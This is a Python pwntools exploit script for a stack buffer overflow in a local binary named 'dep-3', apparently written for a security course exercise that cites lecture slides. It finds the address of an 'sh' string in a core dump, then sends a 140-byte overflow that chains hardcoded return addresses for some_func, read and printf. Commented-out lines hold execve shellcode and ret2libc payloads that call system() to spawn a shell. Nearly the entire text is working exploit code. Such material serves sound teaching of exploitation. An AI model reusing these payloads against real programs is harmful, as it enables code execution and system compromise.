#!/usr/bin/env python
from pwn import *

p = process("./dep-3")
#SHELLCODE = 'j2X\xcd\x80PP[YjGX\xcd\x801\xc91\xd2j\x0bX\x99Rhn/shh//biT[\xcd\x80'

#gdb -> b main -> r -> print system
#system = 0xf7eaf7e0
#system=0xf7e39da0
#cookie=0xfaceb00c

# causes crash: creates core
#in .c: BUFFSIZE=128+8=136
x="A"*1360

p.send(x)
p.wait()
c= Core('core')

sh_addr = c.stack.find('sh')
print("%s"% hex(sh_addr))

p=process("./dep-3")
# slide 44-:
# [buffer] [saved %ebp] [ret addr] [arg 1] [arg2]
#  change saved %ebp to overflow: "AAAA"
#  change ret addr to system()
# [buffer] [ovfl: "AAAA"] [system] [arg 1] [arg 2]
#   Arg 2 of vulnerable func will be Arg 1
#   Arg 1 doesn't matter
# [buffer + 4] [system] [AAAA] [arg 2: addr of shell]
#string="A"*140 + p32(system) + "AAAA" + p32(sh_addr)+p32(0x0)
#string="A"*140 + p32(sh_addr) + "AAAA" + p32(sh_addr)+p32(0x0)

# slide 53:
# [buffer] [AAAA] [some_func] [read()] [printf] [0x00000003] [0xffffd100] [0x00000100]
some_func= 0x08048894
read=0x806d2a0
printf=0x804ede0
#test=0x80bb1c8
string="A"*140 + p32(some_func) + p32(read) + p32(printf) + p32(0x00000003) + p32(0xffffd100) + p32(0x00000100)
#string="A"*140 + p32(some_func) + p32(read) + p32(printf) + p32(0x00000003) + p32(test) + p32(0x00000100)

p.send(string)

p.interactive()

